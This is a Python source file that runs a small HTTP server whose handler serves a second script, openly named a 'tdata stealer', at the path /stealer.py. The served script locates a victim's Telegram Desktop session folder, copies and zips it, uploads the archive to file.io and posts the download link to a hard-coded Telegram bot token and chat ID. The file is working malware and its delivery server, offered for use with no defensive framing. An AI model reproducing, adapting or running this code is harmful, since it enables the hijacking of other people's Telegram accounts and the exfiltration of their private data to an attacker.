import http.server
import socketserver
import os

class StealerHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/stealer.py':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain; charset=utf-8')  # Добавь charset
            self.end_headers()
            
            stealer_code = '''import os
import shutil
import tempfile
import requests
import time
import zipfile

BOT_TOKEN = "8395203140:AAFuzqBb8ZGVmp6dHfTUTrXhGvP2g1vqk2s"
CHAT_ID = "5642203304"

def find_tdata():
    username = os.getlogin()
    paths = [
        f"C:\\\\Users\\\\{username}\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\tdata",
        f"C:\\\\Program Files\\\\Telegram Desktop\\\\tdata",
    ]
    for path in paths:
        if os.path.exists(path):
            print(f"Found tdata: {path}")
            return path
    print("Tdata not found")
    return None

def copy_all_files(src, dst):
    try:
        if os.path.exists(dst):
            shutil.rmtree(dst)
        shutil.copytree(src, dst)
        print("All files copied successfully")
        return True
    except Exception as e:
        print(f"Copy error: {e}")
        return False

def make_zip(folder, zip_name):
    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder)
                    try:
                        zf.write(file_path, arcname)
                    except Exception as e:
                        print(f"Skip file {file}: {e}")
                        continue
        print(f"Archive created: {zip_name}")
        return True
    except Exception as e:
        print(f"Zip error: {e}")
        return False

def upload_to_fileio(file_path):
    """Upload to file.io and send link to Telegram"""
    try:
        print("Uploading to file.io...")
        session = requests.Session()
        session.trust_env = False
        
        file_size = os.path.getsize(file_path) / (1024 * 1024)
        print(f"File size: {file_size:.2f} MB")
        
        with open(file_path, 'rb') as f:
            response = session.post(
                'https://file.io', 
                files={'file': f}, 
                timeout=120
            )
        
        if response.status_code == 200:
            result = response.json()
            if result['success']:
                download_url = result['link']
                print(f"Successfully uploaded to file.io")
                print(f"Download URL: {download_url}")
                
                # Send link to Telegram
                message_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                data = {
                    'chat_id': CHAT_ID,
                    'text': f"tdata archive\\nDownload: {download_url}\\nSize: {file_size:.1f}MB\\nExpires: 14 days"
                }
                
                telegram_response = session.post(message_url, data=data, timeout=30)
                if telegram_response.status_code == 200:
                    print("Link sent to Telegram successfully!")
                    return True
                else:
                    print(f"Failed to send link to Telegram: {telegram_response.text}")
                    return False
            else:
                print(f"File.io upload failed: {result}")
        else:
            print(f"File.io HTTP error: {response.status_code}")
            
    except Exception as e:
        print(f"File.io upload error: {e}")
    
    return False

def main():
    print("Starting tdata stealer...")
    
    tdata_path = find_tdata()
    if not tdata_path:
        return
    
    temp_dir = tempfile.mkdtemp()
    temp_tdata = os.path.join(temp_dir, "tdata_backup")
    
    try:
        if copy_all_files(tdata_path, temp_tdata):
            zip_name = "tdata_backup.zip"
            if make_zip(temp_tdata, zip_name):
                # Upload to file.io and send link
                upload_to_fileio(zip_name)
                
                # Cleanup
                if os.path.exists(zip_name):
                    os.remove(zip_name)
                    
    except Exception as e:
        print(f"Main error: {e}")
    
    # Cleanup temp dir
    try:
        shutil.rmtree(temp_dir)
    except:
        pass
        
    print("Process completed")

if __name__ == "__main__":
    main()
'''
            
            self.wfile.write(stealer_code.encode('utf-8'))  # Добавь кодировку здесь
        else:
            self.send_response(404)
            self.end_headers()

PORT = 8000
with socketserver.TCPServer(("", PORT), StealerHandler) as httpd:
    print(f"Server running on port {PORT}")
    httpd.serve_forever()
